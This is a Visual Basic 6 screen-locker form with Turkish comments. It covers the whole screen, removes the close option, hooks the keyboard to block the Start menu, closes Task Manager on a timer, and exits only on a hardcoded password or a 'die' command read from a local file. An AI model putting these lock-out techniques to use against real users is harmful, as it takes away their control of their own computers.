VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   0  'None
   Caption         =   " "
   ClientHeight    =   6480
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   8595
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   Icon            =   "Sifre.frx":0000
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   MouseIcon       =   "Sifre.frx":15162
   MousePointer    =   99  'Custom
   Moveable        =   0   'False
   ScaleHeight     =   6480
   ScaleWidth      =   8595
   ShowInTaskbar   =   0   'False
   Begin VB.Timer Timer2 
      Interval        =   100
      Left            =   4200
      Top             =   2160
   End
   Begin VB.Timer Timer1 
      Left            =   840
      Top             =   2100
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   96
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H8000000E&
      Height          =   3495
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   3255
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
'closes windows
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Const WM_CLOSE = &H10
'close menu remover
Private Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Private Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Private Declare Function GetSystemMenu Lib "user32" (ByVal hwnd As Long, ByVal bRevert As Long) As Long
Private Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Private Const MF_BYPOSITION = &H400: Private Const MF_REMOVE = &H1000: Private Const SC_CLOSE = &HF060&
'password
Dim bak(7) As Integer: Dim i As Integer: Dim hhkLowLevelKybd As Long
Private Sub Form_KeyPress(KeyAscii As Integer)
    If KeyAscii = bak(i) Then i = i + 1 Else i = 1
    If i = 8 Then End
End Sub
Private Sub Form_Load()
    'close menu remover
    Dim hMenu As Long 'Menu Handle
    Dim menuItemCount As Long 'Menu Count
    Dim theItem As Long 'Item To remove
    Dim i As Long
    hMenu = GetSystemMenu(Me.hwnd, 0) 'Get system menu From Form
    theItem = -1 'Set initial variable For "not found"
    If hMenu Then 'If found then
        menuItemCount = GetMenuItemCount(hMenu) 'Retrieve menu count
        For i = 0 To menuItemCount 'Look for the "close" ID
            If GetMenuItemID(hMenu, i) = SC_CLOSE Then
                theItem = i 'If found, quit Loop
                Exit For
            End If
        Next i
        If theItem <> -1 Then 'If found then remove Item
            Call RemoveMenu(hMenu, theItem, MF_REMOVE Or MF_BYPOSITION)
        End If
        If GetMenuItemID(hMenu, theItem - 1) = 0 Then 'If previous item is a menu sep
            Call RemoveMenu(hMenu, theItem - 1, MF_REMOVE Or MF_BYPOSITION) 'then remove it For consistency.
        End If
        Call DrawMenuBar(Me.hwnd) 'Draw it!
    End If
    'start menu disabler
    hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, AddressOf LowLevelKeyboardProc, App.hInstance, 0)
    'always on top + full screen
    AlwaysOnTop Me, True: Me.Top = 0: Me.Left = 0: Me.Width = Screen.Width: Me.Height = Screen.Height: Label1.Width = Screen.Width: Label1.Height = Screen.Height: i = 1
    bak(1) = 105    'i
    bak(2) = 104    'h
    bak(3) = 116    't
    bak(4) = 105    'i
    bak(5) = 121    'y
    bak(6) = 97     'a
    bak(7) = 114    'r
End Sub
Private Sub Form_Unload(Cancel As Integer)
    If hhkLowLevelKybd <> 0 Then UnhookWindowsHookEx hhkLowLevelKybd
End Sub
Private Sub Timer1_Timer()
    Dim winHwnd As Long: Dim RetVal As Long
    winHwnd = FindWindow(vbNullString, "Windows Task Manager")
    If winHwnd = 0 Then winHwnd = FindWindow(vbNullString, "Windows Görev Yöneticisi")
    If winHwnd <> 0 Then PostMessage winHwnd, WM_CLOSE, 0&, 0&
    Me.SetFocus
End Sub
Private Sub Timer2_Timer() 'bana gelen emir var mý?
    Dim MsgOrder, MsgTxt, MsgSize, T_Font, T_Size, T_Color, T_Bold, T_Italic, T_Strike, T_Underline, T_Back As String: Dim MsgVarMý As Boolean
    If Dir("C:\network.txt") = "" Then GoTo DosyaYok
    'gelen mesaj varmý diye bakýyor.
    Open "C:\network.txt" For Input As #1: MsgVarMý = False
bas:
    If EOF(1) Then GoTo son 'yoksa yada mesajýn sonuysa...
    'varsa hemen mesajý alip gerekli islemleri yap
    Input #1, MsgOrder, MsgTxt
    If MsgOrder = "write" Then 'to take the given fonts to the label
    Input #1, T_Font, T_Size, T_Color, T_Bold, T_Italic, T_Strike, T_Underline, T_Back
        Label1.Caption = MsgTxt
        Label1.Font.Name = T_Font
        Label1.Font.Size = T_Size
        Label1.ForeColor = T_Color
        Label1.Font.Bold = T_Bold
        Label1.Font.Italic = T_Italic
        Label1.Font.Strikethrough = T_Strike
        Label1.Font.Underline = T_Underline
        Label1.BackColor = T_Back
    ElseIf MsgOrder = "order" Then
        If MsgTxt = "lockscreens" Then
        ElseIf MsgTxt = "unlockscreens" Then
        ElseIf MsgTxt = "die" Then
            Close #1: Open "C:\network.txt" For Output As #1: Close #1
            End
        End If
    End If
    GoTo DosyaYok
son:
    Close #1
    Exit Sub
DosyaYok:
    Close #1: Open "C:\network.txt" For Output As #1: Close #1
End Sub

